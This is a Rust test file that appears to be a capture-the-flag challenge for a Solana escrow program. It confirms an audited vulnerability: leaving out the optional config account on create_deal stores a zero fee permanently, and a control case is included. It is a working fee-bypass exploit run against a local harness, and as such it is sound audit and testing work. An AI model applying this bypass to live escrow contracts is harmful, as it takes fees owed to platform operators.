//! Challenge: Fee Free — exploit optional config omission on create_deal.
//!
//! Audit: AUDIT/12 #1 (TRUE POSITIVE), AUDIT/04 F-03, AUDIT/08 P0-1.
//!
//! When platform config exists with active fees, a caller can omit the optional
//! `config` account and permanently snapshot `fee_bps = 0` on the deal.

use sealed_ctf_tests::escrow_ix::{create_deal_ix, fund_escrow_ix, vault_pda};
use sealed_ctf_tests::harness::{require_escrow_so, LocalChallenge};
use sealed_ctf_tests::setup::{init_fee_platform, ChallengeActors};
use sealed_ctf_tests::{ONE_USDC, Signer};

#[tokio::test]
#[ignore = "requires anchor build (../target/deploy/escrow.so)"]
async fn challenge_fee_free_config_omission_bypasses_platform_fee() {
    if require_escrow_so().is_none() {
        return;
    }

    let mut challenge = LocalChallenge::new().await.expect("harness");
    let actors = ChallengeActors::bootstrap(&mut challenge)
        .await
        .expect("bootstrap");

    init_fee_platform(&mut challenge, actors.treasury_owner.pubkey())
        .await
        .expect("fee platform");

    let deal_id = "ctf-fee-free";
    let amount = 10 * ONE_USDC;

    // EXPLOIT: omit config — deal snapshots fee_bps = 0 permanently.
    let create_ix = create_deal_ix(
        actors.buyer.pubkey(),
        actors.seller.pubkey(),
        actors.mint,
        deal_id,
        amount,
        actors.buyer.pubkey(),
        false, // include_config = false → fee bypass
    );
    challenge
        .challenge
        .run_ixs_full(&[create_ix], &[&actors.buyer], &actors.buyer.pubkey())
        .await
        .expect("create_deal without config should succeed");

    // Fund without treasury ATA — succeeds only because deal is fee-free.
    let fund_ix = fund_escrow_ix(
        actors.buyer.pubkey(),
        deal_id,
        actors.buyer_ata,
        amount,
        vault_pda(deal_id),
        None, // no treasury
    );
    challenge
        .challenge
        .run_ixs_full(&[fund_ix], &[&actors.buyer], &actors.buyer.pubkey())
        .await
        .expect("fee-free deal funds without treasury");

    // Control: deal created WITH config requires treasury on fund.
    let deal_id_fee = "ctf-fee-control";
    let create_fee_ix = create_deal_ix(
        actors.buyer.pubkey(),
        actors.seller.pubkey(),
        actors.mint,
        deal_id_fee,
        amount,
        actors.buyer.pubkey(),
        true, // include config → fee snapshotted
    );
    challenge
        .challenge
        .run_ixs_full(&[create_fee_ix], &[&actors.buyer], &actors.buyer.pubkey())
        .await
        .expect("create with config");

    let fund_no_treasury = fund_escrow_ix(
        actors.buyer.pubkey(),
        deal_id_fee,
        actors.buyer_ata,
        amount,
        vault_pda(deal_id_fee),
        None,
    );
    let err = challenge
        .challenge
        .run_ixs_full(
            &[fund_no_treasury],
            &[&actors.buyer],
            &actors.buyer.pubkey(),
        )
        .await
        .expect_err("fee-bearing deal must reject missing treasury");

    eprintln!("Fee Free challenge: exploit succeeded (fee bypass confirmed)");
    eprintln!("Control rejected fund without treasury: {err}");
}
